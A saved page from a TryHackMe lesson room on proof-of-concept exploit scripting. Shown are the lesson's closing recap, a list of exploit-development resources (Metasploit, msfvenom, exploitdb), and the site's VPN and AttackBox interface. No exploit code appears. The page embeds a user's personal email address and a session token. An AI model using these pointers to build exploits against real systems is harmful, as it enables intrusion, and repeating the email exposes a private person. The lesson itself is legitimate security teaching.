parameters</span></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">how to begin identifing vulnerabilities in code and point out the exploitable endpoints</span></span></li><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">common exploit development methodologies</span></span></li><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">reading metasploit source code</span></span></li><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">using a wide range of resources to craft scripts<br></span></span></li></ul><p><span style="font-family:&quot;Arial&quot;"><span>I want to emphasize that this is only one example upon the millions of vulnerabilities that exist and covering every unique one in a short amount of time is impossible, what matters is generating a method and approach. I also want to emphasize that Metasploit is not the only resource out there for developing <a class="g0mUPTgI glossary-term" onclick="initPopOver(&#39;PoC&#39;, &#39;g0mUPTgI&#39;)">PoC</a> scripts and exploits in general, they are one of the largest so its an excellent resource for learning by example. I encourage you to find other resources for </span></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">vulnerable </span>open source software and create your own test environment with virtual machines and containers to use privately. Exploit development is a wide ranging skill from the scope covered in this room to advanced security researching discovering undisclosed and unknown vulnerabilities. As with any skill in life, <b>the more you practice the more proficient you'll become</b>. While I'm new to information security, in my opinion you don't need to be a genius to develop exploits. As long as you have patience, research skills, an open mind, diligence and perseverance, you can accomplish any task you set out for. <br></span></p><p><u><b><span style="font-family:&quot;Arial&quot;;font-size:24px">Resources for exploit development</span></b></u></p><ul><li><span style="font-family:&quot;Arial&quot;">Metasploit resources (module source code, <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom" target="_blank">msfevnom</a>)</span></li><li><span style="font-family:&quot;Arial&quot;">exploitdb (</span><code>searchsploit</code><span style="font-family:&quot;Arial&quot;">), hackerone, 0day, packet storm, secfocus, vulndb, cvedetails, github, vulners<br></span></li><li><span style="font-family:&quot;Arial&quot;"><a href="https://netsec.ws/?p=262" target="_blank">Converting Metasploit Module to Stand Alone</a></span></li><li><span style="font-family:&quot;Arial&quot;"><a href="https://null-byte.wonderhowto.com/how-to/exploit-development-everything-you-need-know-0167801/" target="_blank">Null-Byte Exploit Development - Everything You Need to Know</a></span></li><li><span style="font-family:&quot;Arial&quot;"><a href="https://github.com/tanc7/hacking-books/blob/master/Violent%20Python%20-%20A%20Cookbook%20for%20Hackers%2C%20Forensic%20Analysts%2C%20Penetration%20Testers%20and%20Security%20Engineers.pdf" target="_blank">Violent Python - </a></span><span style="box-sizing:border-box;color:rgb(36, 41, 46)"><span style="font-family:&quot;Arial&quot;"><a href="https://github.com/tanc7/hacking-books/blob/master/Violent%20Python%20-%20A%20Cookbook%20for%20Hackers%2C%20Forensic%20Analysts%2C%20Penetration%20Testers%20and%20Security%20Engineers.pdf" target="_blank">A Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security</a></span></span></li><li><span style="box-sizing:border-box;color:rgb(36, 41, 46)"><span style="font-family:&quot;Arial&quot;"><a href="https://searchsecurity.techtarget.com/definition/proof-of-concept-PoC-exploit" target="_blank">What is a proof of concept exploit?</a><br></span></span></li></ul><p><span style="font-family:&quot;Arial&quot;">I sincerely hope you found value in this room and I thank you for the time. Good luck with your infosec journey :)</span></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Check out some of those links for more reading material.<br>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="7">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Completed
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div></div>
</div>
<div id="room-simple-details"><div class="card cd-2 text-center mt-3"><div class="card-body"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Intro PoC Scripting_files/b7dacea71ff3d66f5a82e63c6451b76a.jpg"> 
        <a class="green-link" href="https://tryhackme.com/p/cd6629">cd6629</a></p><p class="mb-0">This is a <b>free</b> room, which means anyone can deploy virtual machines in the room 
        (without being subscribed)! 3950 users are in here and this room is 998 days old.</p></div></div></div>

</div>
</div>
</div>
<div id="room-content-attackbox">
<div id="room-attackbox">
<div id="attackbox-machine-instance">
<div id="room-attackbox-loading"></div>
<div id="room-attackbox-vm-view"></div>
</div>
<div id="attackbox-machine-options">
<div class="d-flex">
<a target="_blank" id="room-attackbox-url" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="View in full screen"></a>
<div onclick="extendHourWebBasedVM(null)" class="hover-pointer" id="room-attackbox-extend" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Extend machines timer"><i class="fas fa-plus"></i></div>
<div onclick="terminateWebBasedVM(null)" class="hover-pointer" id="room-attackbox-terminate" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Terminate Machine"><i class="far fa-power-off"></i></div>
<div onclick="exitViewAttackBox()" class="hover-pointer" id="room-attackbox-exitview" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Exit split view"><i class="fas fa-minus"></i></div>
<div onclick="infoAttackBox()" class="hover-pointer faded" id="room-attackbox-info" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Machine Information"><i class="fas fa-info"></i></div>
<div class="d-flex" id="room-attackbox-tabs"></div>
</div>
<div id="room-attackbox-expire-text" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Time left until your AttackBox expires"></div>
</div>
</div>
<div class="modal fade" id="attackBoxInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header modal-light-gray">
<h5 class="modal-title m-auto">Web-Based Machine Information</h5>
</div>
<div class="modal-body">
<p>Use the web-based machine to attack other target machines you start on TryHackMe.</p>
<ul class="normalList text-gray mt-3 mb-4">
<li>Public IP: <code id="browser-machine-pubip" class="dark size-14"></code></li>
<li class="mt-1">Private IP: <code id="browser-machine-privip" class="dark size-14"></code> <span class="size-14">(Use this for your reverse shells)</span></li>
<li class="mt-1">Username: <code id="browser-username" class="dark size-14"></code></li>
<li class="mt-1">Password: <code id="browser-password" class="dark size-14"></code></li>
<li class="mt-1">Protocol: <code id="browser-protocol" class="dark size-14"></code></li>
</ul>
<hr class="hr-min">
<ul class="text-lgray mb-0">
<li class="mt-2">To copy to and from the browser-based machine, highlight the text and press <b>CTRL+SHIFT+C</b> <details><summary>or use the clipboard</summary><img src="./TryHackMe _ Intro PoC Scripting_files/clipboard.gif"></details></li>
<li class="mt-2">When accessing target machines you start on TryHackMe tasks, make sure you're using the correct IP (it <b>should not be</b> the IP of your AttackBox)</li>
</ul>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="award-modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<button type="button" class="close size-30 text-lgray" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
<div id="award-modal-badges"></div>
<p class="mb-0 text-lgray size-18">Complete the room to earn this badge</p>
</div>
</div>
</div>
</div>
<div class="modal fade" id="hint-modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title"><i class="fal fa-lightbulb-on"></i> Question Hint</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body"></div>
</div>
</div>
</div>
<div class="modal fade" id="modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title">...</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body text-center"></div>
<div class="modal-footer"></div>
</div>
</div>
</div>
<link rel="stylesheet" href="./TryHackMe _ Intro PoC Scripting_files/modal.css">
<div class="modal-design-green modal fade" id="roomCompleted" tabindex="-1" role="dialog" data-backdrop="static" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content" id="roomCompletedModalContent">
<div class="modal-body text-center">
<button type="button" class="close" id="closeRoomComplete" aria-label="Close">
<i class="fad fa-times-circle"></i>
</button>
<div class="icon-box">
<i class="fad fa-badge-check"></i>
</div>
<h3 class="text-accent mt-5">Congratulations</h3>
<p class="faded mt-1">You've completed the room! Share this with your friends: </p>
<h2 id="roomCompleted-share"></h2>
<div id="ticket-info"></div> 
<p class="faded mt-1" id="roomFeedbackBtn">
<small>
<button class="bg-white border-0">Leave
feedback</button>
</small>
</p>
<form method="post" action="https://tryhackme.com/feedback" id="roomFeedbackForm" class="d-none mt-3">
<input type="hidden" name="_csrf" value="3xDQjxjt-Y69RsFhutd6YGaphCL8jQYaJA48">
<input type="hidden" name="roomCode" value="intropocscripting">
<input type="hidden" name="type" value="rooms">
<input type="hidden" name="redirect" value="json">
<div class="form-group">
<label class="mb-0" for="like">What do you like about the room?</label>
<textarea type="text" name="like" id="like" class="form-control"></textarea>
</div>
<div class="form-group">
<label class="mb-0" for="dislike">What don't you like about the room?</label>
<textarea type="text" name="dislike" id="dislike" class="form-control"></textarea>
</div>
<div class="form-group">
<label class="mb-0" for="details">Please send your suggestions, ideas and comments!</label>
<textarea id="details" type="text" name="details" class="form-control" style="padding: 5px;"></textarea>
</div>
<button type="submit" id="submitBtn" class="btn btn-success">Send Feedback</button>
</form>
<p class="mt-2 mb-0" id="formMessage"></p>
</div>
</div>
</div>
<script>
    function dismissRoomCompleteModal() {
      $('#roomCompleted').modal('hide');

      const shouldSeeReferralModal = ""
      if (shouldSeeReferralModal) {
        $('#unlockCreditModal').modal('show');

        referralModalEvent('view');
      }
    }

    document.getElementById('closeRoomComplete').addEventListener('click', dismissRoomCompleteModal)
  </script>
</div>
<script src="./TryHackMe _ Intro PoC Scripting_files/roomFeedback.js"></script>
<div class="modal fade" id="roomStartAttackboxModal" tabindex="-1" role="dialog" aria-hidden="true" data-backdrop="static" data-keyboard="false">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title m-auto">To access this machine, you need to either</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close" style="position: absolute; right: 10px; top: 0; font-size: 30px;">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body text-center">
<div class="row vertical-align-custom mb-0">
<div class="col-sm-5 pr-0">
<p class="size-18 bold">Use a VPN</p>
<p>Connect to our network via a VPN</p>
<a target="_blank" href="https://tryhackme.com/access"><button type="button" class="btn btn-light">See Instructions</button></a>
</div>
<div class="col-sm-2 size-24">
or
</div>
<div class="col-sm-5 pl-0">
<p class="size-18 bold">Use the AttackBox</p>
<p>Use a web-based attack machine <span class="size-12">(recommended)</span></p>
<button type="button" onclick="$(&#39;#roomStartAttackboxModal&#39;).modal(&#39;toggle&#39;); startAttackBox({startingMsg: false, tutorial: true})" class="btn btn-hgreen">Start AttackBox</button>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="expireSoon" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<h1><i class="text-warning fad fa-exclamation-triangle"></i></h1>
<h3 class="text-warning">Expiring Soon</h3>
<p class="faded mt-3 mb-0">Your machine is going to expire soon. Close this and add an hour to stop it from terminating!</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="terminatedMachine" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<h1><i class="text-danger fad fa-exclamation-triangle"></i></h1>
<h3 class="text-danger">Expired Machine</h3>
<p class="faded mt-3 mb-0">Your machine has expired and terminated.</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="machineDeployModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue text-center p-3">
<h4 class="mb-0 m-auto">How to access machines</h4>
<button type="button" class="close modal-close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body text-center">
<p class="size-18 faded">Now you've started your machine, to access it you need to either</p>
<div class="row mb-0">
<div class="col-sm-6">
<img src="./TryHackMe _ Intro PoC Scripting_files/connect_openvpn_short.png">
<p class="mt-2 mb-0 faded">Download your VPN configuration file and import it into a OpenVPN client</p>
</div>
<div class="col-sm-6">
<img src="./TryHackMe _ Intro PoC Scripting_files/connect_kali_short.png">
<p class="mt-2 mb-0 faded">Control a web-based machine with everything you need, all from inside your browser</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="roomAlertModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title" id="roomAlertModalTitle"></h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body" id="roomAlertModalBody"></div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="resetUserProgressModal" role="dialog">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title">Reset Your Progress</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body">
<div><span class="text-danger"><i class="fas fa-exclamation-triangle"></i> Warning</span> You will keep your points but all your answers in this room will be erased.</div>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-danger" onclick="resetProgress()">Yes, please!</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="cloudEnvInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header  modal-dark-blue">
<h5 class="modal-title">Cloud Information</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body">
<ul class="nav nav-tabs">
<li class="nav-item pr-2">
<a class="nav-link active" data-toggle="tab" href="https://tryhackme.com/room/intropocscripting#env-tab">Environment</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/intropocscripting#creds-tab">Credentials</a>
</li>
</ul>
<div class="tab-content">
<div class="tab-pane active" id="env-tab"></div>
<div class="tab-pane" id="creds-tab"></div>
</div>
</div>
<div class="modal-footer" id="cloudEnvModalFooter">
</div>
</div>
</div>
</div>
<div class="modal fade" id="setNameModal" role="dialog">
<div class="modal-dialog modal-lg modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title">Generating Your Certificate</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body container">
<div class="row">
<div class="col-6">
<h5 class="bold">Hey there, what's your name?</h5>
<p class="text-secondary">
If you want your name to appear on your certificate, please fill the field below.
</p>
<div class="form-group">
<label>Full Name </label>
<input id="modal-cert-field-name" type="text" placeholder="John Wick" class="mb-4 form-control">
<input id="modal-cert-field-email" type="hidden" value="giftonpaul@karunya.edu.in">
</div>
</div>
<div class="col-6">
<h5 class="bold">You're here incognito? It's ok!</h5>
<p class="text-secondary">If you chose skip, your username will be used instead!</p>
</div>
</div>
<div class="row">
<div class="col-6">
<button type="button" class="btn btn-success float-right" id="modal-cert-generate" onclick="gen_cert(true)" disabled="">
Generate with my full name
</button>
</div>
<div class="col-6">
<button type="button" class="btn btn-primary float-right" id="modal-cert-skip" onclick="gen_cert(false)">
Generate with my username
</button>
</div>
</div>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Intro PoC Scripting_files/certificateName.js"></script>
<div class="modal fade slideout-faq" id="roomSlideoutUnstuck" tabindex="-1" role="dialog">
<div class="modal-dialog modal-dialog-slideout" role="document">
<div class="modal-content">
<div class="modal-body">
<div id="slideout-links">
<div id="unstuck-video" class="unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-play"></i></div>
<div class="unstuck-icon-text">Video Solution</div>
</div>
<div id="unstuck-writeups" class="unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-pen-alt"></i></div>
<div class="unstuck-icon-text">Writeups</div>
</div>
<a id="unstuck-forum" target="_blank" class="clear-link unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-comments-alt"></i></div>
<div class="unstuck-icon-text">Forum Post</div>
</a>
<a href="https://help.tryhackme.com/en/collections/3601905-getting-started-with-tryhackme" target="_blank" class="clear-link unstuck-group">
<div class="unstuck-icon"><i class="fas fa-books"></i></div>
<div class="unstuck-icon-text">Knowledge Base</div>
</a>
<a href="https://discord.gg/DpBZz8y" target="_blank" class="clear-link unstuck-group">
<div class="unstuck-icon"><i class="fas fa-users"></i></div>
<div class="unstuck-icon-text">Ask Community</div>
</a>
</div>
</div>
</div>
</div>
</div>
<style>

    #navConnModal .modal-body{
        position: relative;
    }

    #nav-openvpn,
    #nav-attackbox {
        display: none;
    }

    #nav-openvpn .nav-pills .nav-link.active,
    #nav-openvpn .nav-pills .show>.nav-link {
        background-color: #ec8e3d;
        color: white;
    }
    #nav-openvpn .nav-link {
        color: #909090;
    }
    #nav-openvpn a,
    #nav-attackbox a {
        color: #ec8e3d;
    }

    #nav-openvpn code.dark {
        background-color: #7d400a;
        color: #fff;
    }

    #slideout-bk {
        display: none;
        padding: 10px 15px;
        opacity: 0.8;
        cursor: pointer;
    }

    #slideout-bk:hover {
        opacity: 1;
    }

    #slideout-conn-hideip {
        display: none;
        position: absolute;
        bottom: 8px;
        right: 8px;
        opacity: 0.7;
        cursor: pointer;
    }

    #slideout-conn-hideip:hover {
        opacity: 1;
    }

</style>
<div class="modal fade slideout-faq" id="navConnModal" tabindex="-1" role="dialog">
<div class="modal-dialog modal-dialog-slideout" role="document">
<div class="modal-content">
<div class="modal-body">
<div id="slideout-bk" class="noselect" onclick="showSlideoutConnOptions()"><i class="far fa-arrow-left mr-2"></i> Show Connection Options</div>
<div id="slideout-conn-options">
<div id="slideout-conn-header" class="text-center">
<img class="slideout-connect-img" src="./TryHackMe _ Intro PoC Scripting_files/tryhackme_connect.png">
<div id="slideout-conn-status" class="size-22">You are <span class="text-danger">disconnected</span></div>
</div>
<div class="m-3 text-center">
<p>To access target machines you need to either:</p>
<div class="row mb-3 faq-quicklinks text-left vertical-align-custom">
<div class="col-md-12 mb-3">
<a class="clear-link preventDefault" href="https://tryhackme.com/room/intropocscripting#" onclick="showAttackBoxSteps()">
<div class="card card-body">
<div class="row vertical-align-custom">
<div class="col col-2 text-center faq-quicklinks-icons">
<i class="far fa-laptop"></i>
</div>
<div class="col">
<div class="faq-quicklinks-title size-18">AttackBox</div>
<p class="faded mb-0">Use a browser-based attack machine</p>
</div>
</div>
</div>
</a>
</div>
<div class="col-md-12">
<a class="clear-link preventDefault" href="https://tryhackme.com/room/intropocscripting#" onclick="showVPNSteps()">
<div class="card card-body">
<div class="row vertical-align-custom">
<div class="col col-2 text-center faq-quicklinks-icons">
<i class="far fa-key"></i>
</div>
<div class="col">
<div class="faq-quicklinks-title size-18">OpenVPN</div>
<p class="faded mb-0">Connect to our network via a VPN</p>
</div>
</div>
</div>
</a>
</div>
</div>
</div>
</div>
<div id="faqCards" class="p-3">
<div id="nav-openvpn">
<div class="mb-3">
<a target="_blank" href="https://tryhackme.com/access"><i>View the dedicated OpenVPN access page for more information</i></a>
</div>
<div class="text-center">
<h4>What Operating System are you using?</h4>
<ul class="nav nav-pills mb-3 text-center" id="vpn-guide" style="display: flex; justify-content: center;">
<li class="nav-item m-3">
<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/intropocscripting#pills-windows" role="tab" aria-controls="pills-windows" aria-selected="true"><i class="fab fa-windows mr-2"></i> Windows</a>
</li>
<li class="nav-item m-3">
<a class="nav-link active" data-toggle="pill" href="https://tryhackme.com/room/intropocscripting#pills-linux" role="tab" aria-controls="pills-linux" aria-selected="false"><i class="fab fa-linux mr-2"></i> Linux</a>
</li>
<li class="nav-item m-3">
<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/intropocscripting#pills-macos" role="tab" aria-controls="pills-macos" aria-selected="false"><i class="fab fa-apple mr-2"></i> MacOS</a>
</li>
</ul>
<div class="tab-content text-left">
<div class="tab-pane fade" id="pills-windows" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2"><a target="_blank" href="https://openvpn.net/client-connect-vpn-for-windows/">Download</a> the OpenVPN GUI application.</li>
<li class="mt-2">Install the OpenVPN GUI application. Then open the installer file and follow the setup wizard.</li>
<li class="mt-2">Open and run the OpenVPN GUI application as Administrator.<br><img class="mt-2 mb-3" src="./TryHackMe _ Intro PoC Scripting_files/win_ran_admin.png"></li>
<li class="mt-2">The application will start running in the system tray. It's at the bottom of your screen, near the clock. Right click on the application and click <b>Import File</b>. <br><img class="mt-2 mb-3" src="./TryHackMe _ Intro PoC Scripting_files/win_import.png"></li>
<li class="mt-2">Select the configuration file you downloaded earlier.</li>
<li class="mt-2">Now right click on the application again, select your file and click Connect <br><img class="mt-2 mb-3" src="./TryHackMe _ Intro PoC Scripting_files/win_connect.png"></li>
</ol>
</div>
<div class="tab-pane fade show active" id="pills-linux" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2">Run the following command in your terminal: <code class="dark">sudo apt install openvpn</code></li>
<li class="mt-2">Locate the full path to your VPN configuration file (normally in your ~/Downloads folder).</li>
<li class="mt-2">Use your OpenVPN file with the following command: <code class="dark">sudo openvpn /path/to/file.ovpn</code></li>
</ol>
</div>
<div class="tab-pane fade" id="pills-macos" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2"><a href="https://openvpn.net/downloads/openvpn-connect-v2-macos.dmg">Download</a> OpenVPN for MacOS.</li>
<li class="mt-2">Install the OpenVPN GUI application, by opening the dmg file and following the setup wizard.<br><img width="250" class="mt-2 mb-3" src="./TryHackMe _ Intro PoC Scripting_files/mac_installer.png"></li>
<li class="mt-2">Open and run the OpenVPN GUI application.</li>
<li class="mt-2">The application will start running and appear in your top bar. Right click on the application and click <b>Import File -&gt; Local file</b>.<br><img class="mt-2 mb-3" src="./TryHackMe _ Intro PoC Scripting_files/mac_import.png"></li>
<li class="mt-2">Select the configuration file you downloaded earlier.</li>
<li class="mt-2">Right click on the application again, select your file and click connect.<br><img class="mt-2 mb-3" src="./TryHackMe _ Intro PoC Scripting_files/mac_connect.png"></li>
</ol>
</div>
</div>
<section class="text-left">
<a class="remove-underline" data-toggle="collapse" href="https://tryhackme.com/room/intropocscripting#havingProblems" role="button" aria-expanded="false" aria-controls="havingProblems">
<h5 class="mb-0 text-openvpn">Having Problems?</h5>
</a>
<div class="collapse" id="havingProblems">
<ul class="mt-2 mb-0">
<li>If you can access <a target="_blank" href="http://10.10.10.10/">10.10.10.10</a>, you're connected.</li>
<li>Downloading and getting a 404? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
<li>Getting inline cert error? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
<li>If you are using a virtual machine, you will need to run the VPN inside that machine.</li>
<li>Is the OpenVPN client running as root? <span class="size-14 faded">(On Windows, run OpenVPN GUI as administrator. On Linux, run with sudo)</span></li>
<li>Have you restarted your VM?</li>
<li>Is your OpenVPN up-to-date?</li>
<li>Only 1 OpenVPN connection is allowed. <span class="size-14 faded">(Run <code class="dark">ps aux | grep openvpn</code> - are there 2 VPN sessions running?)</span></li>
<li>Still having issues? Check our <a href="https://help.tryhackme.com/en/articles/6496029-openvpn-general-troubleshooting-detailed/">docs</a> out.</li>
</ul>
</div>
</section>
</div>
</div>
<div id="nav-attackbox">
<div class="text-center">
<h4>AttackBox</h4>
<p class="faded">Use your own web-based linux machine to access machines on TryHackMe</p>
</div>
<p>To start your AttackBox in the room, click the <a class="preventDefault" onclick="showAttackBoxBtnFromSlideout()" href="https://tryhackme.com/room/intropocscripting#">Start AttackBox</a> button. Your private machine will take 2 minutes to start.</p>
<p>Free users get 1 free AttackBox hour. <a class="hacker-green" href="https://tryhackme.com/why-subscribe">Subscribed</a> users get more powerful machines with unlimited deploys.</p>
</div>
</div>
<span id="slideout-conn-hideip" onclick="hideNavConnIP()" style="display: none;">Hide IP</span>
</div>
</div>
</div>
</div>
<script>

    const navConnVPNEl = document.querySelector('#nav-openvpn')
    const navConnAttackBoxEl = document.querySelector('#nav-attackbox')
    const navConnOptions = document.querySelector('#slideout-conn-options')

    const navConnBkBtn = document.querySelector('#slideout-bk')

    function showVPNSteps() {
        navConnOptions.style.display = 'none'
        navConnVPNEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showAttackBoxSteps() {
        navConnOptions.style.display = 'none'
        navConnAttackBoxEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showSlideoutConnOptions() {
        navConnVPNEl.style.display = 'none'
        navConnAttackBoxEl.style.display = 'none'
        navConnBkBtn.style.display = 'none'
        navConnOptions.style.display = 'block'
    }

    function showAttackBoxBtnFromSlideout() {
        $('#navConnModal').modal('toggle')
        setTimeout(function() {
            showAttackBoxBtnIntro()
        }, 100)   
    }

  </script>
</div>
<script src="./TryHackMe _ Intro PoC Scripting_files/notify.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/api-requests.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/events.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/underscore-min.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/apexcharts.min.js"></script> 
<script src="./TryHackMe _ Intro PoC Scripting_files/chart.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/expire.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/sockets.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/faqSearch.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/certificate.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/utils.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/roomSpecific.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/confetti.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/videos.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/intro.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/prism.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/asciinema-player.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/magnific-popup.min.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/introjsLogic.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/logic.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/tasks.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/connection-status.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/glossary.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/room-mymachine.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/heartbeat.js" defer=""></script>
<script>

    let height
    $(window).scroll(function () { /* Function to make IP information sticky. */
      if (height == undefined || height < 30) {
        height = ($('#instance-info').offset().top)
      }
      let scroll = $(window).scrollTop()
      if (((scroll >= (height + 150))) && height > 30) {
        $("#instance-info").addClass('instance-sticky')
      } else if ((scroll <= (height))) {
        $("#instance-info").removeClass("instance-sticky")
      }
    })

    const csrfToken = "3xDQjxjt-Y69RsFhutd6YGaphCL8jQYaJA48"
    $.ajaxSetup({ headers: { 'CSRF-Token': csrfToken } }) // all $.post headers include token (needs csrfProtection middleware)

    const roomCode = "intropocscripting"
    const simpleRoom = true 
    const events = {"tickets":false}

    let userObj = { 
      subscribed: 1,
      splitScreen: false,
      path: "pentesting",
      tutorial: {
        rooms: true,
        attackbox: true,
        staticsite: true
      },
      experiments:  JSON.parse(`{"onboardingAchievement":{},"scheduler":{"startDate":"2023-06-14T13:38:51.108Z"},"showEasyPath":true}`),
    }

    const roomSettings = {
      remAttackBoxBtn : false
    };

    const heartbeatInterval = 30;

    const cloudEnabled = false 
    let cloudObj

    initRoom()
    checkVideoTab()
    if(!simpleRoom) showChart(roomCode)

    checkRoomAwards(roomCode)

    getRoomVotes()

    displayStreakFreezeAwardedFromMemory();
    
    window.addEventListener('load', function () {
      introjsInit(roomCode)
    })

  </script>


